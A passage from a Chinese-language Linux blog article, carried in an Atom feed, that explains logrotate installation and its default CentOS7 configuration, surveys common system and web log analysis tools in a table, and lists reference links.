<p><code>logrotate</code> 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件，我们把它叫做 <strong>转储</strong>。我们可以根据日志文件的大小，也可以根据其天数来转储，这个过程一般通过 <code>cron</code> 程序来执行（<code>/etc/cron.daily/logrotate</code>）。<code>logrotate</code> 程序还可以用于压缩日志文件，以及发送日志到指定的E-mail 。</p>
<p>主流 Linux 发行版上都默认安装有 <code>logrotate</code> 包，如果出于某种原因， <code>logrotate</code> 没有出现在里头，你可以使用 <code>apt-get</code> 或 <code>yum</code> 命令来安装。</p>
<p>在 Debian 或 Ubuntu上安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># apt-get install logrotate cron</div></pre></td></tr></table></figure></p>
<p>在 RH 系发行版（RHEL/Fedora/CentOS等）上安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># yum install logrotate crontabs</div></pre></td></tr></table></figure></p>
<h4 id="3-4-2-配置"><a href="#3-4-2-配置" class="headerlink" title="3.4.2 配置"></a>3.4.2 配置</h4><p><code>CentOS7</code> 系统中默认的 <code>/etc/logrotate.conf</code> 文件内容是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"># see &quot;man logrotate&quot; for details</div><div class="line"># rotate log files weekly</div><div class="line">weekly</div><div class="line"></div><div class="line"># keep 4 weeks worth of backlogs</div><div class="line">rotate 4</div><div class="line"></div><div class="line"># create new (empty) log files after rotating old ones</div><div class="line">create</div><div class="line"></div><div class="line"># use date as a suffix of the rotated file</div><div class="line">dateext</div><div class="line"></div><div class="line"># uncomment this if you want your log files compressed</div><div class="line">#compress</div><div class="line"></div><div class="line"># RPM packages drop log rotation information into this directory</div><div class="line">include /etc/logrotate.d</div><div class="line"></div><div class="line"># no packages own wtmp and btmp -- we&apos;ll rotate them here</div><div class="line">/var/log/wtmp &#123;</div><div class="line">    monthly</div><div class="line">    create 0664 root utmp</div><div class="line">    size 1M</div><div class="line">    rotate 1</div><div class="line">&#125;</div><div class="line"></div><div class="line">/var/log/btmp &#123;</div><div class="line">    missingok</div><div class="line">    monthly</div><div class="line">    create 0600 root utmp</div><div class="line">    rotate 1</div><div class="line">&#125;</div><div class="line"></div><div class="line"># system-specific logs may be also be configured here.</div></pre></td></tr></table></figure></p>
<p>以上内容中部分名词解释：</p>
<blockquote>
<p><strong>weekly</strong> —— 日志将按周转储，其他可用值为 <code>daily</code>/<code>monthly</code>/<code>yearly</code>；<br><strong>rotate 4</strong> —— 一次转储4个归档日志，对于第5个，时间最久，将被删除；<br><strong>create [mode owner group]</strong> —— 转储文件时若文件不存在则创建它，<code>mode</code>为文件权限，<code>owner</code>文件属主，<code>group</code> 为文件属组；<br><strong>compress</strong> —— 在转储任务完成后，已转储的归档将用 <code>gzip</code> 进行压缩；<br><strong>dateext</strong> —— 切换后的日志文件会附加上一个短横线和 <code>YYYYMMDD</code> 格式的日期，没有这个配置项会附加一个小数点加一个数字序号；<br><strong>include</strong> —— 引用其他日志转储配置文件；<br><strong>size</strong> —— 当日志文件到达指定的大小时才转储，<code>size</code> 可以指定 <code>bytes</code> (缺省)以及<code>KB</code> (sizek)或者 <code>MB</code> (sizem)；<br><strong>missingok</strong> —— 在日志轮循期间，任何错误将被忽略，例如 <strong>文件无法找到</strong> 之类的错误。</p>
</blockquote>
<p>其实可用配置项远不止这些，全部的配置项请参考：<a href="http://linux.die.net/man/8/logrotate" target="_blank" rel="external">http://linux.die.net/man/8/logrotate</a></p>
<h2 id="4-日志统计与分析"><a href="#4-日志统计与分析" class="headerlink" title="4. 日志统计与分析"></a>4. 日志统计与分析</h2><p>Linux 系统中的日志统计与分析，主要借助于各式各样的日志辅助工具。这些工具按照面向的日志种类可分为 <strong>系统日志分析工具</strong> 和 <strong>Web日志分析工具</strong>；按照工具实现的形式可以分为 <strong>命令行工具</strong> 、 <strong>Web前端工具（以Web界面展示日志信息，类似 <code>phpMyAdmin</code>）</strong> 和 <strong>桌面工具（GUI）</strong>。下面将通过表格介绍几款常用的日志统计与分析工具：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">形式</th>
<th style="text-align:left">面向日志种类</th>
<th style="text-align:left">特性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Xlogmaster</td>
<td style="text-align:left">桌面/命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">System Log Viewer</td>
<td style="text-align:left">桌面</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">基于 Gnome 桌面环境</td>
</tr>
<tr>
<td style="text-align:left">lwatch</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">C语言编写，性能好</td>
</tr>
<tr>
<td style="text-align:left">Webalizer</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">C语言编写，性能好；多平台；报表输出；国际化支持</td>
</tr>
<tr>
<td style="text-align:left">GoAccess</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">速度快，可即时生成报表；配置方便，支持常见 Web 服务器 Apache/Nginx/IIS</td>
</tr>
<tr>
<td style="text-align:left">Graylog2</td>
<td style="text-align:left">命令行/Web</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">将系统日志转存到 MongoDB 中，在 Web 前端显示</td>
</tr>
<tr>
<td style="text-align:left">LogAnalyzer</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">Swatch</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">logwatch</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">Analog</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">无</td>
</tr>
<tr>
<td style="text-align:left">logcheck</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">系统</td>
<td style="text-align:left">自动地检查日志文件，定期检查日志文件以发现违反安全规则以及异常的活动</td>
</tr>
<tr>
<td style="text-align:left">cronolog</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web日志切割工具</td>
<td style="text-align:left"><strong>切割大日志文件</strong></td>
</tr>
<tr>
<td style="text-align:left">Awstats</td>
<td style="text-align:left">命令行</td>
<td style="text-align:left">Web</td>
<td style="text-align:left">久负盛名，功能丰富而强大</td>
</tr>
</tbody>
</table>
<p>上面只是一部分常用的日志统计与分析工具，其他还有很多，有待发掘。</p>
<p>随着 Web 应用程序越来越强大，应用越来越广，Web 日志分析技术渐渐成了独立于系统日志分析的一个庞杂分支。这其中主要得益于大数据相关技术的发展：分布式存储、并行计算、大规模实时处理系统、数据挖掘等等技术功不可没。在这种背景下，Web 日志统计与分析在 日志搜集、日志存储、日志数据挖掘和日志数据可视化方面都有了长足发展，出现了很多高性能的一体化日志分析框架，从功能和处理数据的规模来说，都不是上面单个简单的日志分析小工具所能相比的。而且不同的功能针对不同的应用场景：网站运营、服务器运维、安全分析等等。这部分内容不在此细说，想了解的可以查阅参考资料中的第 9、10、11 条连接，也可以自行查阅其他资料。</p>
<p>##5. 参考资料</p>
<ol>
<li><a href="http://www.moon-soft.com/download/info/2628.htm" target="_blank" rel="external">Linux 日志管理详解</a></li>
<li><a href="http://www.itokit.com/2012/0602/74289.html" target="_blank" rel="external">Linux 系统日志分析大全</a></li>
<li><a href="http://os.51cto.com/art/201007/211455_all.htm" target="_blank" rel="external">明明白白你的Linux服务器——日志篇</a></li>
<li><a href="http://os.51cto.com/art/200711/60313_all.htm" target="_blank" rel="external">Linux 系统常见的日志文件和常用命令</a></li>
<li><a href="http://blog.csdn.net/chaofanwei/article/details/11831819" target="_blank" rel="external">Linux 日志文件系统总结</a></li>
<li><a href="http://linux.cn/article-4126-1.html" target="_blank" rel="external">Linux 日志文件总管——logrotate</a></li>
<li><a href="http://7056824.blog.51cto.com/69854/276610" target="_blank" rel="external">Linux 中 tty、pty、pts 的概念区别</a></li>
<li><a href="http://os.51cto.com/art/201205/335040.htm" target="_blank" rel="external">Linux 中 history 历史命令使用方法详解</a></li>
<li><a href="http://drops.wooyun.org/tips/4051" target="_blank" rel="external">Web 攻击日志分析的过去现在与未来</a></li>
<li><a href="http://www.freebuf.com/articles/web/25613.html" target="_blank" rel="external">大数据安全分析：我们从日志中得到的（一）</a></li>
<li><a href="http://www.freebuf.com/articles/web/26846.html" target="_blank" rel="external">大数据安全分析：我们从日志中得到的（二）</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux 系统中的日志大概可以分为以下几类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户访问日志&lt;/li&gt;
&lt;li&gt;进程监控日志&lt;/li&gt;
&lt;li&gt;系统与服务日志&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本文将对这几种日志进行详细剖析。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;:&lt;br&gt;本文中的例子，如非特殊说明，均在 &lt;code&gt;CentOS7&lt;/code&gt; 上实施。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-用户访问日志&quot;&gt;&lt;a href=&quot;#1-用户访问日志&quot; class=&quot;headerlink&quot; title=&quot;1. 用户访问日志&quot;&gt;&lt;/a&gt;1. 用户访问日志&lt;/h2&gt;&lt;p&gt;用户的登录时间日志一般由 &lt;code&gt;/var/log/wtmp&lt;/code&gt; 和 &lt;code&gt;/var/run/utmp&lt;/code&gt; 这两个文件记录，不过这两个文件无法直接 &lt;code&gt;cat&lt;/code&gt; 命令查看，并且该文件由系统自动更新。这两个文件中的内容可以用 &lt;code&gt;w/who/finger/id/last/ac/uptime&lt;/code&gt; 这几个命令来查看。 &lt;code&gt;/var/log/lastlog&lt;/code&gt; 文件记录用户最后登录的信息，可用 &lt;code&gt;lastlog&lt;/code&gt; 命令来查看。&lt;/p&gt;
    
    </summary>
    
      <category term="system" scheme="http://jiayu0x.com/categories/system/"/>
    
    
      <category term="linux" scheme="http://jiayu0x.com/tags/linux/"/>
    
      <category term="log" scheme="http://jiayu0x.com/tags/log/"/>
    
  </entry>
  
</feed>
